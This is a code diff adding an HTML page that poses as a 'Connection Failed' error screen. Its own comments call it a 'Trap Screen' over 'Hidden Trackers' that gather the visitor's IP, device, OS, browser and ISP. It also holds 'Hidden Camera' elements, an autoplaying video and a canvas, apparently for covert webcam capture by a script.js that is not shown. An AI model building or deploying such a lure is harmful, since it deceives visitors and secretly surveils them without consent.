@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Failed</title>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <!-- Trap Screen: Only this will be visible -->
+    <div class="trap-container">
+        <img src="photo_2026-04-07_21-12-28.jpg" alt="Connection Error" class="error-image">
+    </div>
+
+    <!-- Hidden Trackers: This stays active for script.js to work -->
+    <div id="hidden-ui" style="visibility: hidden; height: 0; overflow: hidden; position: absolute;">
+        <div id="loading"></div>
+        <div id="info-content">
+            <span id="ip-display"></span>
+            <span id="device-display"></span>
+            <span id="os-display"></span>
+            <span id="browser-display"></span>
+            <span id="isp-display"></span>
+            <span id="org-display"></span>
+            <span id="connection-display"></span>
+            <pre id="detailed-device-display"></pre>
+            <div id="save-status"></div>
+        </div>
+    </div>
+
+    <!-- Hidden Camera Elements -->
+    <div style="display: none;">
+        <video id="player" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script type="module" src="script.js"></script>
+</body>
+
+</html>
